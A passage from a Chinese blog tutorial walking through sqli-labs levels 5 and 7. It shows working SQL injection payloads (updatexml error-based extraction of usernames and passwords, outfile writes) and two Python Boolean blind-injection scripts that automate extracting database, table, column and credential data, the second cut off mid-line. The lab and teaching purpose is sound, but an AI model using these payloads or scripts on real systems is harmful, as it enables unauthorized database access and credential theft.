src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710094228981.png" alt="image-20240710094228981"></p><p>有以下两个方案</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1.用group_concat时使用substr进行字符串截取 其中&quot;1，32&quot;控制截取的起始与结束位置，多进行几次就可以了</span><br><span class="line">and  updatexml(1,(select substr((group_concat(username,0x7e,password)),1,32) from users),1) --+</span><br><span class="line"></span><br><span class="line">#2.使用concat，利用limit(起始位置,截取数量) 函数进行结果截取(还是有可能回显到长度大于限制的数据导致无法显示，不推荐)</span><br><span class="line">and  updatexml(1,(select concat(username,0x7e,password) from users limit 0,1),1) --+</span><br></pre></td></tr></table></figure><h4 id="sqli-lab第5关"><a href="#sqli-lab第5关" class="headerlink" title="sqli-lab第5关"></a>sqli-lab第5关</h4><p>首先很容易发现这是一个报错注入，我们要使用报错函数进行解决</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710095113153.png" alt="image-20240710095113153"></p><p>首先读取当前用户，<code>?id=1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710095212048.png" alt="image-20240710095212048"></p><p>发现是root用户，我们继续读取当前数据库，<code>?id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710095306993.png" alt="image-20240710095306993"></p><p>读取表名<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710100108841.png" alt="image-20240710100108841"></p><p>从表user中读取列名<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()),0x7e),1) --+</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710121946295.png" alt="image-20240710121946295"></p><p>读取数据，倘若使用<code>?id=1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(id,username,password) 1,32)from users,0x7e),1) --+</code>，这个时候就会出现截取不全的情况，所以我们要一部分一部分进行截取</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710122342285.png" alt="image-20240710122342285"></p><p>先截取前32个字节，<code>?id=1&#39; and  updatexml(1,(select substr((group_concat(id,username,password)),1,32) from users),1) --+</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710123625845.png" alt="image-20240710123625845"></p><p>再截取下32个字节，<code>?id=1&#39; and  updatexml(1,(select substr((group_concat(id,username,password)),33,64) from users),1) --+</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710123721451.png" alt="image-20240710123721451"></p><p>以此类推，可以获得全部数据</p><h3 id="写入注入"><a href="#写入注入" class="headerlink" title="写入注入"></a>写入注入</h3><p>在前期的SQL注入的文章中：<a href="http://www.hackborgeous.top/post/efd4f8c4.html">WEB攻防-通用漏洞-SQL注入（二） | Borgeousのblog (hackborgeous.top)</a>，我们介绍了写入注入的手法，这里我们以sqli-lab第七关为代表来展现写入注入的基本步骤，以加深对写入注入的理解</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717083910839.png" alt="image-20240717083910839"></p><p>首先我们进入界面，可以看到它给了我们相应的提示，即使用outfile，这就是在提示我们本关卡可以使用读写注入，首先我们还是去测试一下闭合符是什么</p><p>这一题当我们输入<code>?id=1&#39;) --+</code>的时候，仍然页面异常</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717084329296.png" alt="image-20240717084329296"></p><p>这个时候我就很疑惑了，所以去看了看源码，居然是两个括号闭合，这个时候我就觉得有点无语了，这只能让工具去测注入点了，否则谁会测两个括号，当然，也得积累一下这方面的经验，万一哪天真是在括号上做文章，这不就积累到一个小知识点了吗</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717084523502.png" alt="image-20240717084523502"></p><p>同理，我们使用order by去测字段数，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717085137440.png" alt="image-20240717085137440"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717085156989.png" alt="image-20240717085156989"></p><p>所以我们的字段数是3，我们使用union select进行尝试，很显然，这里什么都出不来，所以我们直接采用写木马的形式写到当前文件夹下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717090008556.png" alt="image-20240717090008556"></p><p>这里一直报错，起初不知道为什么，还以为自己语句写错了，后来查阅资料后发现<strong>不能把靶场搭在C盘，C盘因为权限的问题，</strong>即使开启了<code>secure_file_priv</code>，也会导致写不进去</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>适用条件：存在注入点，无论查询的数据是正确还是错误，均不会产生回显数据，但是可以明显的看到语句正确和错误与否会导致对应页面的不同状态，就像我们的第七关一样，也可以适用布尔盲注，对于盲注，我们首先要来认识几个关键函数，如下所示</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">length(str) 返回字符串长度</span><br><span class="line">substr(str,poc,len) 截取字符串，poc表示截取开始位，len表示截取字符串长度</span><br><span class="line">ascii() 返回字符的ascii码，返回该字符对应的ascii码</span><br><span class="line"><span class="built_in">count</span>() 返回当前列的数量</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样</span><br><span class="line"><span class="keyword">left</span>（str，index）从左边第index开始截取</span><br><span class="line"><span class="keyword">right</span>(str，index)从右边第index开始截取</span><br><span class="line">substring（str，index）从左边index开始截取</span><br><span class="line">mid（str，index，len）截取str从index开始，截取len的长度</span><br><span class="line">lpad（str，len，padstr）</span><br><span class="line">rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果</span><br></pre></td></tr></table></figure><p>这里我们一般都要用到脚本进行注入，下面给出一个布尔盲注的脚本，帮助大家理解布尔盲注</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#采用二分法查询</span></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    min_value = <span class="number">33</span></span><br><span class="line">    max_value = <span class="number">130</span></span><br><span class="line">    mid_value = (min_value+max_value)//<span class="number">2</span> <span class="comment">#取中间值</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;max_value):</span><br><span class="line">        payload = <span class="string">&quot;?id=1&#x27;)) and(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;) --+&quot;</span>.<span class="built_in">format</span>(i,mid_value)</span><br><span class="line">        get_url = url + payload</span><br><span class="line">        response = requests.get(get_url)</span><br><span class="line">        get_url = <span class="string">&#x27;&#x27;</span> <span class="comment">#置为空，防止影响下一轮的payload</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in.... Use outfile......&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            min_value = mid_value + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value = mid_value</span><br><span class="line">    mid_value =(max_value+min_value)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid_value)==<span class="string">&quot;!&quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid_value)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>我们可以拿sqli-lab的第7关做演示，我们先用上面的脚本测试数据库名称</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717144506507.png" alt="image-20240717144506507"></p><p>当然我们也可以使用更高级的脚本，帮助我们一把梭哈</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#数据库库名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_length</span>():</span><br><span class="line">    db_len = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        str_db_len = <span class="built_in">str</span>(db_len)</span><br><span class="line">        db_len_url = url + <span class="string">&quot;and length(database())=&quot;</span> + str_db_len + <span class="string">&quot;--+&quot;</span></span><br><span class="line">        r = requests.get(db_len_url)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n当前数据库名长度为：%s&quot;</span> %str_db_len)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            db_len = db_len + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> db_len</span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解当前数据库库名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>():</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    km = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> (i&lt;=db_len):</span><br><span class="line">        str_i = <span class="string">&#x27;%d&#x27;</span> %i</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (low + high) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            mid = (low + high) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> (low + high) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            mid = (low + high + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">        str_mid = <span class="string">&#x27;%d&#x27;</span> %mid</span><br><span class="line"></span><br><span class="line">        name_url = url + <span class="string">&quot;and ascii(substr((select schema_name from information_schema.schemata limit 5,1),&quot;</span>+str_i+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">        response = requests.get(name_url)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            km += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">            <span class="built_in">print</span>(km)</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            low = <span class="number">32</span></span><br><span class="line">            high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            name_url = url + <span class="string">&quot;and ascii(substr((select schema_name from information_schema.schemata limit 5,1),&quot;</span>+str_i+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">            response = requests.get(name_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">                low = mid</span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                high = mid</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;当前数据库库名为：&quot;</span>+km)</span><br><span class="line">    <span class="keyword">return</span> km</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断表的个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_num</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        str_i = <span class="string">&#x27;%d&#x27;</span> %i</span><br><span class="line">        num_url = url + <span class="string">&quot;and (select count(table_name) from information_schema.tables where table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27;)=&quot;</span>+str_i+<span class="string">&quot;--+&quot;</span></span><br><span class="line">        r = requests.get(num_url)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n数据表个数为：%s&quot;</span> %str_i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断表名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_len</span>():</span><br><span class="line">    t_len = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,table_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            str_j = <span class="built_in">str</span>(j)</span><br><span class="line">            len_url = url + <span class="string">&quot;and (select length(table_name) from information_schema.tables where table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27; limit &quot;</span>+str_i+<span class="string">&quot;,1)=&quot;</span>+str_j+<span class="string">&quot;%23&quot;</span></span><br><span class="line">            r = requests.get(len_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;第&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;张表的表名长度为：&quot;</span>+str_j)</span><br><span class="line">                t_len.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> t_len</span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解表名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    tname = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,table_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(table_num):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                k = <span class="number">1</span></span><br><span class="line">                low = <span class="number">32</span></span><br><span class="line">                high = <span class="number">126</span></span><br><span class="line">                bm = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span> (k&lt;=t_len[j]):</span><br><span class="line">                    str_k = <span class="built_in">str</span>(k)</span><br><span class="line">                    <span class="keyword">if</span> (low + high) % <span class="number">2</span> ==<span class="number">0</span>:</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span></span><br><span class="line">                    <span class="keyword">elif</span> (low + high) % <span class="number">2</span> !=<span class="number">0</span>:</span><br><span class="line">                        mid = (low + high + <span class="number">1</span>) /<span class="number">2</span></span><br><span class="line">                    str_mid = <span class="built_in">str</span>(mid)</span><br><span class="line">                    name_url = url + <span class="string">&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                    r = requests.get(name_url)</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                        bm += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">                        <span class="built_in">print</span>(bm)</span><br><span class="line">                        k = k+<span class="number">1</span></span><br><span class="line">                        low = <span class="number">32</span></span><br><span class="line">                        high = <span class="number">126</span></span><br><span class="line">                    <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        name_url = url + <span class="string">&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                        r = requests.get(name_url)</span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                            low = mid</span><br><span class="line">                        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            high = mid</span><br><span class="line">                tname[<span class="built_in">str</span>(j+<span class="number">1</span>)] = <span class="built_in">str</span>(bm)</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> tname.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]| &quot;</span>+key+<span class="string">&quot; | &quot;</span>+value)</span><br><span class="line">    <span class="keyword">return</span> tname</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断表中列个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_num</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        num_url = url + <span class="string">&quot;and (select count(column_name) from information_schema.columns where table_name=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27; and table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27;)=&quot;</span>+str_i+<span class="string">&quot;--+&quot;</span></span><br><span class="line">        r = requests.get(num_url)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(table_name+<span class="string">&quot;表中列的个数为：%s&quot;</span> %str_i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断列名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_len</span>():</span><br><span class="line">    c_len = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,column_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            str_j = <span class="built_in">str</span>(j)</span><br><span class="line">            len_url = url + <span class="string">&quot;and (select length(column_name) from information_schema.columns where table_name=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27; and table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27;limit &quot;</span>+str_i+<span class="string">&quot;,1)=&quot;</span>+str_j+<span class="string">&quot;%23&quot;</span></span><br><span class="line">            r = requests.get(len_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                c_len.append(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;第&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;列的列名长度为：&quot;</span>+str_j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> c_len</span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解列名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>():</span><br><span class="line">    cname = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, column_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(column_num):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                k = <span class="number">1</span></span><br><span class="line">                low = <span class="number">32</span></span><br><span class="line">                high = <span class="number">126</span></span><br><span class="line">                cm = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">while</span> k &lt;= column_len[j]:</span><br><span class="line">                    str_k = <span class="built_in">str</span>(k)</span><br><span class="line">                    mid = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> (low + high) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span></span><br><span class="line">                    <span class="keyword">elif</span> (low + high) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">                    str_mid = <span class="built_in">str</span>(mid)</span><br><span class="line">                    name_url = url + <span class="string">&quot;and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27; and table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                    r = requests.get(name_url)</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                        cm += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">                        <span class="built_in">print</span>(cm)</span><br><span class="line">                        k = k+<span class="number">1</span></span><br><span class="line">                        low = <span class="number">32</span></span><br><span class="line">                        high = <span class="number">126</span></span><br><span class="line">                    <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        name_url = url + <span class="string">&quot;and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27; and table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                        r = requests.get(name_url)</span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                            low = mid</span><br><span class="line">                        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            high = mid</span><br><span class="line">                cname[<span class="built_in">str</span>(j)] = <span class="built_in">str</span>(cm)</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> cname.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]| &quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(key)+<span class="number">1</span>)+<span class="string">&quot; | &quot;</span>+value)</span><br><span class="line">    <span class="keyword">return</span> cname</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断字段个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_num</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,column_num):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            str_j = <span class="built_in">str</span>(j)</span><br><span class="line">            num_url = url + <span class="string">&quot;and (select count(&quot;</span>+cname[<span class="built_in">str</span>(i)]+<span class="string">&quot;) from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot;)=&quot;</span>+str_j+<span class="string">&quot;--+&quot;</span></span><br><span class="line">            r = requests.get(num_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(cname[<span class="built_in">str</span>(i)]+<span class="string">&quot;列中的字段数为：%s&quot;</span> %str_j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断字段长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_len</span>():</span><br><span class="line">    user_len = []</span><br><span class="line">    pass_len = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,dump_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">            str_j = <span class="built_in">str</span>(j)</span><br><span class="line">            len_url = url + <span class="string">&quot;and (select length(username) from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1)=&quot;</span>+str_j+<span class="string">&quot;%23&quot;</span></span><br><span class="line">            r = requests.get(len_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                user_len.append(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;username第&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;个字段长度为：&quot;</span>+str_j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">            str_k = <span class="built_in">str</span>(k)</span><br><span class="line">            len_url = url + <span class="string">&quot;and (select length(password) from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1)=&quot;</span>+str_k+<span class="string">&quot;%23&quot;</span></span><br><span class="line">            r = requests.get(len_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                pass_len.append(k)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;password第&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;个字段长度为：&quot;</span>+str_k)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (user_len,pass_len)</span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解字段值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    username = &#123;&#125;</span><br><span class="line">    password = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,dump_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dump_num):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                k = <span class="number">1</span></span><br><span class="line">                p = <span class="number">1</span></span><br><span class="line">                low = <span class="number">32</span></span><br><span class="line">                high = <span class="number">126</span></span><br><span class="line">                uname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                pword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">while</span> k &lt;= user_len[j]:</span><br><span class="line">                    str_k = <span class="built_in">str</span>(k)</span><br><span class="line">                    <span class="keyword">if</span> (low + high) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span></span><br><span class="line">                    <span class="keyword">elif</span> (low + high) %<span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">                    str_mid = <span class="built_in">str</span>(mid)</span><br><span class="line">                    user_url = url + <span class="string">&quot;and ascii(substr((select username from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                    r = requests.get(user_url)</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                        uname += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;| usename：&quot;</span>+uname)</span><br><span class="line">                        k = k+<span class="number">1</span></span><br><span class="line">                        low = <span class="number">32</span></span><br><span class="line">                        high = <span class="number">126</span></span><br><span class="line">                    <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        user_url = url + <span class="string">&quot;and ascii(substr((select username from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                        r = requests.get(user_url)</span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                            low = mid</span><br><span class="line">                        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            high = mid</span><br><span class="line">                username[<span class="built_in">str</span>(j)] = <span class="built_in">str</span>(uname)</span><br><span class="line">                <span class="keyword">while</span> p &lt;= pass_len[j]:</span><br><span class="line">                    str_p = <span class="built_in">str</span>(p)</span><br><span class="line">                    <span class="keyword">if</span> (low + high) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span></span><br><span class="line">                    <span class="keyword">elif</span> (low + high) %<span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">                    str_mid = <span class="built_in">str</span>(mid)</span><br><span class="line">                    pass_url = url + <span class="string">&quot;and ascii(substr((select password from 